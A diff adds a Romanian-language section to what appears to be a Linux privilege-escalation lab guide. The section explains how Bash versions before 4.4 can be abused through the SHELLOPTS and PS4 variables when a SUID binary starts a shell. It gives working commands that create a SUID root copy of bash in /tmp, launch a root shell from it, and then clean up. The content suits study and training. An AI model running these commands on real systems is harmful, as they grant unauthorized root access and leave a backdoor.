@@ -366,5 +366,44 @@ Pentru a intercepta apelul binarului SUID și a obține un shell cu privilegii d
    /usr/local/bin/suid-env2
    ```
 
-> ⚠️ **Notă:** Ca și în cazul precedent, rulează comanda `exit` la final pentru a închide sesiunea de root.
+---
+
+## 11. SUID Executable via Bash Debugging (SHELLOPTS & PS4)
+
+### Mecanism & Vulnerabilitate
+Această tehnică profită de o vulnerabilitate din versiunile de **Bash < 4.4**. Atunci când un binar SUID invocă un shell în spate, un atacator poate forța acel shell să ruleze în modul de depanare (*debugging*) și să execute comenzi arbitrare ca `root` prin intermediul variabilelor de mediu.
+
+Vulnerabilitatea se bazează pe manipularea a două variabile specifice:
+1. `SHELLOPTS=xtrace`: Activează modul de urmărire și depanare a execuției (`set -x`), forțând Bash să afișeze un prompt special înaintea fiecărei comenzi rulate.
+2. `PS4`: Definește structura acelui prompt de depanare. În versiunile vulnerabile de Bash, conținutul acestei variabile este evaluat prin interpolare de comenzi (`$(...)`). Deoarece binarul apelat rulează cu privilegii SUID de `root`, codul injectat în `PS4` este executat automat cu drepturi administrative supreme.
+
+### Detecție și Verificare
+Atacul este fezabil dacă binarul țintă are bitul SUID setat și versiunea de Bash de pe sistem este inferioară versiunii 4.4:
+```bash
+/bin/bash --version
+```
+
+### Etape de Exploatare (PoC)
+
+1. **Injectarea payload-ului și generarea binarului SUID malițios:**
+   Rulăm executabilul curățând mediul (`env -i`) și setând variabilele buclucașe. Payload-ul va copia binarul Bash legitim în `/tmp` și îi va aplica bitul SUID:
+   ```bash
+   env -i SHELLOPTS=xtrace PS4='\$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+   ```
+
+2. **Lansarea shell-ului de root:**
+   După ce prima comandă a creat binarul capcană cu drepturi ridicate, executăm noul shell folosind parametrul `-p` pentru a forța păstrarea privilegiilor de `root`:
+   ```bash
+   /tmp/rootbash -p
+   ```
+
+3. **Curățarea urmelor:**
+   Pentru a nu lăsa un backdoor SUID periculos în directorul temporar, ștergem fișierul generat imediat după finalizarea testului:
+   ```bash
+   rm /tmp/rootbash
+   exit
+   ```
+
+
+
 
